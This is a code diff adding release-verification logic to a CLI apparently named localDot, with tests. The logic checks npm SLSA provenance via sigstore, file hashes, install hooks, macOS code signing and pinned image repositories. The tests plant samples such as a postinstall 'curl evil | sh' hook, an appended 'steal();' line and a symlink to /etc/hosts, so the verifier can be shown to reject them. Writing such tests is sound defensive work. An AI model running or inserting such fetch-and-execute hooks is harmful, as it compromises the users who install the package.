@@ -0,0 +1,74 @@
+import { verify } from "sigstore";
+import { describe, expect, it } from "vitest";
+import { npmAttestationUrl, provenanceChecker, type SigstorePolicy } from "./provenance.ts";
+
+// Opt-in: reads one public attestation from registry.npmjs.org and sigstore's TUF repository.
+const NET = process.env.LOCALDOT_NET_TESTS === "1";
+
+// hono@4.13.12 is published with provenance from a tag, as localDot's releases are: its identity
+// is https://github.com/honojs/hono/.github/workflows/release.yml@refs/tags/v4.13.12. Its integrity
+// is the registry's (and pnpm-lock.yaml's), read 2026-10-02.
+const HONO = {
+  name: "hono",
+  version: "4.13.12",
+  integrity:
+    "sha512-6E2QDAc9Ick9Sq77ZrGS/dk2WUYni91aufTw6LJKpV7w8kW5/GxVUc650FOADOmlwg3K+f7Pun6XlV+pYmW6gw==",
+};
+const ISSUER = "https://token.actions.githubusercontent.com";
+const fetchAttestations = async (name: string, version: string) => {
+  const res = await fetch(npmAttestationUrl(name, version));
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  return res.json();
+};
+const sigstoreVerify = async (bundle: unknown, policy: SigstorePolicy) => {
+  await verify(bundle as Parameters<typeof verify>[0], policy);
+};
+
+describe.runIf(NET)("provenance through the real sigstore (LOCALDOT_NET_TESTS=1)", () => {
+  it("accepts a real attestation for its real repository, workflow and tag", async () => {
+    const check = provenanceChecker(
+      {
+        repository: "https://github.com/honojs/hono",
+        workflow: ".github/workflows/release.yml",
+        issuer: ISSUER,
+      },
+      fetchAttestations,
+      sigstoreVerify,
+    );
+    await expect(check(HONO)).resolves.toBeUndefined();
+  }, 60_000);
+
+  it("refuses the same attestation for localDot's pins: sigstore checks the identity", async () => {
+    const check = provenanceChecker(
+      {
+        repository: "https://github.com/Shadowhusky/localdot",
+        workflow: ".github/workflows/release.yml",
+        issuer: ISSUER,
+      },
+      fetchAttestations,
+      sigstoreVerify,
+    );
+    await expect(check(HONO)).rejects.toMatchObject({
+      check: "provenance",
+      message: expect.stringMatching(
+        /does not verify for https:\/\/github.com\/Shadowhusky\/localdot/,
+      ),
+    });
+  }, 60_000);
+
+  it("refuses a real attestation when the tarball is another one", async () => {
+    const check = provenanceChecker(
+      {
+        repository: "https://github.com/honojs/hono",
+        workflow: ".github/workflows/release.yml",
+        issuer: ISSUER,
+      },
+      fetchAttestations,
+      sigstoreVerify,
+    );
+    const other = { ...HONO, integrity: `sha512-${Buffer.alloc(64, 1).toString("base64")}` };
+    await expect(check(other)).rejects.toMatchObject({
+      message: expect.stringMatching(/another tarball/),
+    });
+  }, 60_000);
+});
diff --git a/apps/cli/src/verify/provenance.ts b/apps/cli/src/verify/provenance.ts
new file mode 100644
index 0000000..55ae782
--- /dev/null
+++ b/apps/cli/src/verify/provenance.ts
@@ -0,0 +1,112 @@
+import { ReleaseVerificationError } from "./errors.ts";
+import type { TrustPins } from "./trust.ts";
+
+export const SLSA_V1 = "https://slsa.dev/provenance/v1";
+export const GITHUB_WORKFLOW_BUILD =
+  "https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1";
+const IN_TOTO = "application/vnd.in-toto+json";
+
+export interface PackageSpec {
+  name: string;
+  version: string;
+  // The lockfile's integrity for the tarball npm installed: "sha512-<base64>".
+  integrity: string;
+}
+
+export interface SigstorePolicy {
+  certificateIdentityURI: string;
+  certificateIssuer: string;
+}
+
+// sigstore's verify in production (sigstore 5.0.0): it checks the bundle's signature, certificate
+// chain, transparency log entry and that the certificate names exactly this identity and issuer.
+export type BundleVerifier = (bundle: unknown, policy: SigstorePolicy) => Promise<void>;
+export type AttestationFetcher = (name: string, version: string) => Promise<unknown>;
+export type ProvenanceCheck = (spec: PackageSpec) => Promise<void>;
+
+export function npmAttestationUrl(name: string, version: string): string {
+  return `https://registry.npmjs.org/-/npm/v1/attestations/${name.replace("/", "%2f")}@${version}`;
+}
+
+export function purl(name: string, version: string): string {
+  return `pkg:npm/${name.replace(/^@/, "%40")}@${version}`;
+}
+
+export function provenanceChecker(
+  pins: Pick<TrustPins, "repository" | "workflow" | "issuer">,
+  fetchAttestations: AttestationFetcher,
+  verifyBundle: BundleVerifier,
+): ProvenanceCheck {
+  return async ({ name, version, integrity }) => {
+    const fail = (why: string): never => {
+      throw new ReleaseVerificationError("provenance", `${name}@${version}: ${why}`);
+    };
+    const m = /^sha512-([A-Za-z0-9+/]{86}==)$/.exec(integrity);
+    if (!m?.[1]) return fail("the lockfile has no sha512 integrity for it");
+    const tarballSha512 = Buffer.from(m[1], "base64").toString("hex");
+    const ref = `refs/tags/v${version}`;
+    let doc: unknown;
+    try {
+      doc = await fetchAttestations(name, version);
+    } catch (err) {
+      return fail(`its attestations could not be fetched (${(err as Error).message})`);
+    }
+    const attestations = (doc as { attestations?: unknown } | null)?.attestations;
+    const slsa = Array.isArray(attestations)
+      ? attestations.filter((a) => (a as { predicateType?: unknown })?.predicateType === SLSA_V1)
+      : [];
+    if (slsa.length !== 1)
+      return fail(`want exactly one SLSA provenance attestation, found ${slsa.length}`);
+    const bundle = (slsa[0] as { bundle?: unknown }).bundle;
+    try {
+      await verifyBundle(bundle, {
+        certificateIdentityURI: `${pins.repository}/${pins.workflow}@${ref}`,
+        certificateIssuer: pins.issuer,
+      });
+    } catch (err) {
+      return fail(
+        `its provenance does not verify for ${pins.repository} (${(err as Error).message})`,
+      );
+    }
+    // The payload below is what the verified signature covers.
+    const envelope = (bundle as { dsseEnvelope?: { payload?: unknown; payloadType?: unknown } })
+      ?.dsseEnvelope;
+    if (envelope?.payloadType !== IN_TOTO || typeof envelope.payload !== "string") {
+      return fail("the provenance is not an in-toto statement");
+    }
+    let statement: {
+      subject?: { name?: unknown; digest?: { sha512?: unknown } }[];
+      predicateType?: unknown;
+      predicate?: {
+        buildDefinition?: {
+          buildType?: unknown;
+          externalParameters?: {
+            workflow?: { repository?: unknown; path?: unknown; ref?: unknown };
+          };
+        };
+      };
+    };
+    try {
+      statement = JSON.parse(Buffer.from(envelope.payload, "base64").toString("utf8"));
+    } catch {
+      return fail("the provenance payload is not JSON");
+    }
+    if (statement.predicateType !== SLSA_V1) return fail("the statement is not SLSA v1 provenance");
+    const subjects = Array.isArray(statement.subject) ? statement.subject : [];
+    const ours = subjects.find((s) => s?.name === purl(name, version));
+    if (!ours)
+      return fail(
+        `the provenance is for another package (${subjects.map((s) => String(s?.name)).join(", ")})`,
+      );
+    if (ours.digest?.sha512 !== tarballSha512)
+      return fail("the provenance names another tarball than the one installed");
+    const build = statement.predicate?.buildDefinition;
+    if (build?.buildType !== GITHUB_WORKFLOW_BUILD)
+      return fail("it was not built by a GitHub Actions workflow");
+    const workflow = build.externalParameters?.workflow;
+    if (workflow?.repository !== pins.repository)
+      return fail(`it was built from ${String(workflow?.repository)}`);
+    if (workflow.path !== pins.workflow) return fail(`it was built by ${String(workflow.path)}`);
+    if (workflow.ref !== ref) return fail(`it was built from ${String(workflow.ref)}, not ${ref}`);
+  };
+}
diff --git a/apps/cli/src/verify/release.test.ts b/apps/cli/src/verify/release.test.ts
new file mode 100644
index 0000000..64cdf6b
--- /dev/null
+++ b/apps/cli/src/verify/release.test.ts
@@ -0,0 +1,214 @@
+import {
+  appendFileSync,
+  chmodSync,
+  readFileSync,
+  rmSync,
+  symlinkSync,
+  writeFileSync,
+} from "node:fs";
+import { join } from "node:path";
+import { describe, expect, it, vi } from "vitest";
+import {
+  type FakeProvenanceOptions,
+  fakeAttestations,
+  fakeSigstore,
+  type StagedRelease,
+  stageRelease,
+  TEST_PINS,
+} from "../testing/staged-release.ts";
+import { ReleaseVerificationError } from "./errors.ts";
+import { provenanceChecker } from "./provenance.ts";
+import { type VerifyDeps, verifyStagedRelease } from "./release.ts";
+import { keydRequirement } from "./trust.ts";
+
+function deps(
+  s: StagedRelease,
+  over: Partial<VerifyDeps> = {},
+  prov: Record<string, FakeProvenanceOptions> = {},
+): VerifyDeps {
+  return {
+    pins: TEST_PINS,
+    codesign: vi.fn(async () => true),
+    provenance: provenanceChecker(
+      TEST_PINS,
+      async (name, version) => fakeAttestations(name, version, s.tarballs[name] ?? "", prov[name]),
+      fakeSigstore,
+    ),
+    ...over,
+  };
+}
+
+async function refusal(s: StagedRelease, d: VerifyDeps = deps(s)) {
+  try {
+    await verifyStagedRelease(s.root, s.version, d);
+  } catch (err) {
+    if (err instanceof ReleaseVerificationError) return err;
+    throw err;
+  }
+  throw new Error("the release was accepted");
+}
+
+// biome-ignore lint/suspicious/noExplicitAny: each test edits whichever JSON field it breaks
+const editJson = (path: string, edit: (j: Record<string, any>) => void) => {
+  const j = JSON.parse(readFileSync(path, "utf8"));
+  edit(j);
+  writeFileSync(path, JSON.stringify(j));
+};
+
+describe("verifyStagedRelease", () => {
+  it("accepts a release that is exactly what it says, and checks keyd's signature against the pinned team", async () => {
+    const s = stageRelease();
+    const d = deps(s);
+    const v = await verifyStagedRelease(s.root, s.version, d);
+    expect(v.keydPath).toBe(s.keydPath);
+    expect(d.codesign).toHaveBeenCalledWith(s.keydPath, keydRequirement("TESTTEAM01"));
+    expect(keydRequirement("TESTTEAM01")).toContain('certificate leaf[subject.OU] = "TESTTEAM01"');
+  });
+
+  it("finds keyd nested under the package, as a shrinkwrapped install puts it", async () => {
+    const s = stageRelease("1.0.0", undefined, { nested: true });
+    const v = await verifyStagedRelease(s.root, s.version, deps(s));
+    expect(v.keydPath).toBe(s.keydPath);
+    expect(s.keydPath).toContain("node_modules/localdot/node_modules/@localdot/keyd-darwin-arm64");
+  });
+
+  it("says when keyd is not installed at all", async () => {
+    const s = stageRelease();
+    rmSync(join(s.keydPath, "..", ".."), { recursive: true });
+    expect((await refusal(s)).message).toMatch(/is not installed/);
+  });
+
+  it("refuses another version than the one asked for", async () => {
+    const s = stageRelease("1.0.0");
+    await expect(verifyStagedRelease(s.root, "1.0.1", deps(s))).rejects.toMatchObject({
+      check: "package",
+    });
+  });
+
+  it("refuses a package with an install script", async () => {
+    const s = stageRelease();
+    editJson(
+      join(s.packageDir, "package.json"),
+      (j) => (j.scripts = { postinstall: "curl evil | sh" }),
+    );
+    expect((await refusal(s)).check).toBe("package");
+  });
+
+  it("refuses a changed file, an extra file and a missing file", async () => {
+    const changed = stageRelease();
+    appendFileSync(join(changed.packageDir, "dist/daemon.mjs"), "steal();\n");
+    expect((await refusal(changed)).message).toMatch(/dist\/daemon.mjs is not the file/);
+    const extra = stageRelease();
+    writeFileSync(join(extra.packageDir, "dist/extra.mjs"), "");
+    expect((await refusal(extra)).message).toMatch(/not in the release: dist\/extra.mjs/);
+    const missing = stageRelease();
+    rmSync(join(missing.packageDir, "THIRD-PARTY.md"));
+    expect((await refusal(missing)).message).toMatch(/missing: THIRD-PARTY.md/);
+  });
+
+  it("refuses a symlink in the package", async () => {
+    const s = stageRelease();
+    symlinkSync("/etc/hosts", join(s.packageDir, "dist/link.mjs"));
+    expect((await refusal(s)).message).toMatch(/dist\/link.mjs is not a regular file/);
+  });
+
+  it("refuses a swapped keyd, a keyd with extra files and a keyd that is not executable", async () => {
+    const swapped = stageRelease();
+    writeFileSync(swapped.keydPath, "other");
+    expect((await refusal(swapped)).message).toMatch(/not the binary the release built/);
+    const extra = stageRelease();
+    writeFileSync(join(extra.keydPath, "..", "helper"), "");
+    expect((await refusal(extra)).message).toMatch(/unexpected files: bin\/helper/);
+    const plain = stageRelease();
+    chmodSync(plain.keydPath, 0o644);
+    expect((await refusal(plain)).check).toBe("keyd");
+  });
+
+  it("refuses a keyd that codesign does not accept, or a release naming another team", async () => {
+    const s = stageRelease();
+    expect((await refusal(s, deps(s, { codesign: async () => false }))).message).toMatch(
+      /not signed by localDot's Developer ID/,
+    );
+    const other = stageRelease();
+    editJson(join(other.packageDir, "release.json"), (j) => (j.keyd.teamId = "EVILTEAM99"));
+    expect((await refusal(other)).message).toMatch(/names team EVILTEAM99/);
+  });
+
+  it("refuses everything when this CLI was built without a team id", async () => {
+    const s = stageRelease();
+    const d = deps(s, { pins: { ...TEST_PINS, teamId: null } });
+    expect((await refusal(s, d)).message).toMatch(/names no Apple team/);
+  });
+
+  it("refuses images outside the pinned repositories", async () => {
+    const s = stageRelease();
+    editJson(
+      join(s.packageDir, "release.json"),
+      (j) => (j.images.gate.repository = "ghcr.io/evil/localdot-gate"),
+    );
+    expect((await refusal(s)).check).toBe("images");
+  });
+
+  describe("provenance", () => {
+    const cases: [string, Record<string, FakeProvenanceOptions>, RegExp][] = [
+      [
+        "built from a fork",
+        {
+          localdot: {
+            repository: "https://github.com/evil/localdot",
+            signedIdentity:
+              "https://github.com/evil/localdot/.github/workflows/release.yml@refs/tags/v1.0.0",
+          },
+        },
+        /does not verify/,
+      ],
+      [
+        "signed for our repo but claiming another workflow",
+        { localdot: { path: ".github/workflows/other.yml" } },
+        /does not verify/,
+      ],
+      [
+        "built from a branch, not the tag",
+        { "@localdot/keyd-darwin-arm64": { ref: "refs/heads/main" } },
+        /does not verify/,
+      ],
+      ["for another tarball", { localdot: { digestOf: "something else" } }, /another tarball/],
+      [
+        "for another package",
+        { localdot: { subjectName: "pkg:npm/lodash@1.0.0" } },
+        /another package/,
+      ],
+      ["missing", { localdot: { predicateType: "https://example.com/none" } }, /found 0/],
+      ["ambiguous", { localdot: { extra: 1 } }, /found 2/],
+    ];
+    it.each(cases)("refuses provenance %s", async (_label, prov, message) => {
+      const s = stageRelease();
+      const err = await refusal(s, deps(s, {}, prov));
+      expect(err.check).toBe("provenance");
+      expect(err.message).toMatch(message);
+    });
+
+    it("refuses a lockfile without sha512 integrity", async () => {
+      const s = stageRelease();
+      editJson(
+        join(s.root, "package-lock.json"),
+        (j) => (j.packages["node_modules/localdot"].integrity = "sha1-abc"),
+      );
+      expect((await refusal(s)).message).toMatch(/no sha512 integrity/);
+    });
+
+    it("refuses when the attestations cannot be fetched", async () => {
+      const s = stageRelease();
+      const d = deps(s, {
+        provenance: provenanceChecker(
+          TEST_PINS,
+          async () => {
+            throw new Error("offline");
+          },
+          fakeSigstore,
+        ),
+      });
+      expect((await refusal(s, d)).message).toMatch(/could not be fetched \(offline\)/);
+    });
+  });
+});
diff --git a/apps/cli/src/verify/release.ts b/apps/cli/src/verify/release.ts
new file mode 100644
index 0000000..529d61d
--- /dev/null
+++ b/apps/cli/src/verify/release.ts
@@ -0,0 +1,175 @@
+import { lstatSync, readFileSync } from "node:fs";
+import { createRequire } from "node:module";
+import { dirname, join, relative } from "node:path";
+import { IMAGE_ROLES, KEYD_PACKAGE, ReleaseManifest } from "@localdot/protocol";
+import { ReleaseVerificationError } from "./errors.ts";
+import { listFiles, sha256File } from "./files.ts";
+import type { ProvenanceCheck } from "./provenance.ts";
+import { keydRequirement, type TrustPins } from "./trust.ts";
+
+export interface VerifyDeps {
+  pins: TrustPins;
+  // /usr/bin/codesign --verify --strict -R=<requirement> <path>, true on exit 0.
+  codesign(path: string, requirement: string): Promise<boolean>;
+  provenance: ProvenanceCheck;
+}
+
+export interface VerifiedRelease {
+  version: string;
+  root: string;
+  packageDir: string;
+  keydPath: string;
+  manifest: ReleaseManifest;
+}
+
+const UNHASHED = new Set(["package.json", "release.json"]);
+const KEYD_FILES = new Set(["package.json", "bin/keyd", "LICENSE", "README.md"]);
+const INSTALL_HOOKS = ["preinstall", "install", "postinstall", "prepare"];
+
+// Verifies a release npm installed into `root` (npm install --prefix root localdot@version)
+// before any of it runs: the package and keyd are exactly what the release says, keyd is signed by
+// our Apple team, both tarballs were built from our repository's release workflow at this
+// version's tag, and every image is pinned by digest in our namespace. Read-only.
+export async function verifyStagedRelease(
+  root: string,
+  version: string,
+  deps: VerifyDeps,
+): Promise<VerifiedRelease> {
+  const packageDir = join(root, "node_modules", "localdot");
+
+  const pkg = readJson(join(packageDir, "package.json"), "package") as {
+    name?: unknown;
+    version?: unknown;
+    scripts?: Record<string, unknown>;
+    optionalDependencies?: Record<string, unknown>;
+  };
+  if (pkg.name !== "localdot" || pkg.version !== version) {
+    throw new ReleaseVerificationError(
+      "package",
+      `want localdot@${version}, found ${String(pkg.name)}@${String(pkg.version)}`,
+    );
+  }
+  const hook = INSTALL_HOOKS.find((h) => pkg.scripts?.[h] !== undefined);
+  if (hook) throw new ReleaseVerificationError("package", `it declares a ${hook} script`);
+  if (pkg.optionalDependencies?.[KEYD_PACKAGE] !== version) {
+    throw new ReleaseVerificationError(
+      "package",
+      `it must depend on ${KEYD_PACKAGE} at exactly ${version}`,
+    );
+  }
+
+  const parsed = ReleaseManifest.safeParse(readJson(join(packageDir, "release.json"), "manifest"));
+  if (!parsed.success)
+    throw new ReleaseVerificationError("manifest", parsed.error.issues[0]?.message ?? "invalid");
+  const manifest = parsed.data;
+  if (manifest.version !== version) {
+    throw new ReleaseVerificationError(
+      "manifest",
+      `it describes ${manifest.version}, not ${version}`,
+    );
+  }
+
+  const present = listFiles(packageDir, "files").filter((f) => !UNHASHED.has(f));
+  const listed = Object.keys(manifest.files).sort();
+  const extra = present.filter((f) => !(f in manifest.files));
+  const missing = listed.filter((f) => !present.includes(f));
+  if (extra.length > 0)
+    throw new ReleaseVerificationError(
+      "files",
+      `not in the release: ${extra.slice(0, 5).join(", ")}`,
+    );
+  if (missing.length > 0)
+    throw new ReleaseVerificationError("files", `missing: ${missing.slice(0, 5).join(", ")}`);
+  for (const file of listed) {
+    if ((await sha256File(join(packageDir, file))) !== manifest.files[file]) {
+      throw new ReleaseVerificationError("files", `${file} is not the file the release built`);
+    }
+  }
+
+  // Where Node will find keyd from the package: nested under it (a shrinkwrapped install) or
+  // hoisted to the prefix.
+  let keydDir: string;
+  try {
+    keydDir = dirname(
+      createRequire(join(packageDir, "package.json")).resolve(`${KEYD_PACKAGE}/package.json`),
+    );
+  } catch {
+    throw new ReleaseVerificationError(
+      "keyd",
+      `${KEYD_PACKAGE} is not installed (an Apple silicon Mac is required)`,
+    );
+  }
+  const keydPkg = readJson(join(keydDir, "package.json"), "keyd") as {
+    name?: unknown;
+    version?: unknown;
+  };
+  if (keydPkg.name !== KEYD_PACKAGE || keydPkg.version !== version) {
+    throw new ReleaseVerificationError(
+      "keyd",
+      `want ${KEYD_PACKAGE}@${version}, found ${String(keydPkg.name)}@${String(keydPkg.version)}`,
+    );
+  }
+  const strays = listFiles(keydDir, "keyd").filter((f) => !KEYD_FILES.has(f));
+  if (strays.length > 0)
+    throw new ReleaseVerificationError("keyd", `unexpected files: ${strays.join(", ")}`);
+  const keydPath = join(keydDir, manifest.keyd.path);
+  const st = lstatSync(keydPath, { throwIfNoEntry: false });
+  if (!st?.isFile() || (st.mode & 0o111) === 0)
+    throw new ReleaseVerificationError("keyd", "bin/keyd is missing or not executable");
+  if ((await sha256File(keydPath)) !== manifest.keyd.sha256) {
+    throw new ReleaseVerificationError("keyd", "bin/keyd is not the binary the release built");
+  }
+  if (deps.pins.teamId === null) {
+    throw new ReleaseVerificationError(
+      "keyd",
+      "this build of localdot names no Apple team, so it cannot trust any keyd",
+    );
+  }
+  if (manifest.keyd.teamId !== deps.pins.teamId) {
+    throw new ReleaseVerificationError(
+      "keyd",
+      `the release names team ${manifest.keyd.teamId}, not ${deps.pins.teamId}`,
+    );
+  }
+  if (!(await deps.codesign(keydPath, keydRequirement(deps.pins.teamId)))) {
+    throw new ReleaseVerificationError("keyd", "bin/keyd is not signed by localDot's Developer ID");
+  }
+
+  const lock = readJson(join(root, "package-lock.json"), "provenance") as {
+    packages?: Record<string, { version?: unknown; integrity?: unknown }>;
+  };
+  const lockKeys = { localdot: "node_modules/localdot", [KEYD_PACKAGE]: relative(root, keydDir) };
+  for (const [name, key] of Object.entries(lockKeys)) {
+    const entry = lock.packages?.[key];
+    if (entry?.version !== version || typeof entry.integrity !== "string") {
+      throw new ReleaseVerificationError(
+        "provenance",
+        `the lockfile does not record ${name}@${version}`,
+      );
+    }
+    await deps.provenance({ name, version, integrity: entry.integrity });
+  }
+
+  for (const role of IMAGE_ROLES) {
+    if (manifest.images[role].repository !== deps.pins.imageRepositories[role]) {
+      throw new ReleaseVerificationError(
+        "images",
+        `${role} comes from ${manifest.images[role].repository}`,
+      );
+    }
+  }
+
+  return { version, root, packageDir, keydPath, manifest };
+}
+
+function readJson(path: string, check: ReleaseVerificationError["check"]): unknown {
+  try {
+    return JSON.parse(readFileSync(path, "utf8"));
+  } catch (err) {
+    const code = (err as NodeJS.ErrnoException).code;
+    throw new ReleaseVerificationError(
+      check,
+      `${path.split("/node_modules/").at(-1)}: ${code === "ENOENT" ? "missing" : "unreadable"}`,
+    );
+  }
+}
diff --git a/apps/cli/src/verify/trust.ts b/apps/cli/src/verify/trust.ts
new file mode 100644
index 0000000..0c43903
--- /dev/null
+++ b/apps/cli/src/verify/trust.ts
@@ -0,0 +1,41 @@
+import { type IMAGE_ROLES, KEYD_IDENTIFIER } from "@localdot/protocol";
+
+// What a release must chain to. These are compiled into the CLI, so a release can never vouch for
+// itself: the CLI that installs or updates holds the pins, and the package it verifies does not.
+export interface TrustPins {
+  repository: string;
+  workflow: string;
+  issuer: string;
+  // The Apple Developer ID team that signs keyd; null in a build made without one, which can then
+  // install nothing.
+  teamId: string | null;
+  imageRepositories: Record<(typeof IMAGE_ROLES)[number], string>;
+}
+
+declare const __LOCALDOT_TEAM_ID__: string | undefined;
+
+export const RELEASE_PINS: TrustPins = {
+  repository: "https://github.com/Shadowhusky/localdot",
+  workflow: ".github/workflows/release.yml",
+  issuer: "https://token.actions.githubusercontent.com",
+  teamId: typeof __LOCALDOT_TEAM_ID__ === "string" ? __LOCALDOT_TEAM_ID__ : null,
+  imageRepositories: {
+    desktop: "ghcr.io/shadowhusky/localdot-desktop",
+    gate: "ghcr.io/shadowhusky/localdot-gate",
+    brain: "ghcr.io/shadowhusky/localdot-brain",
+    browser: "ghcr.io/shadowhusky/localdot-browser",
+  },
+};
+
+// keyd's designated requirement: Apple-anchored, a Developer ID Application leaf from our team,
+// issued by the Developer ID CA, for our identifier. The Keychain's access list names this same
+// requirement, so a keyd signed by anyone else neither installs nor reads a key.
+export function keydRequirement(teamId: string): string {
+  return [
+    "anchor apple generic",
+    `identifier "${KEYD_IDENTIFIER}"`,
+    "certificate 1[field.1.2.840.113635.100.6.2.6]",
+    "certificate leaf[field.1.2.840.113635.100.6.1.13]",
+    `certificate leaf[subject.OU] = "${teamId}"`,
+  ].join(" and ");
+}
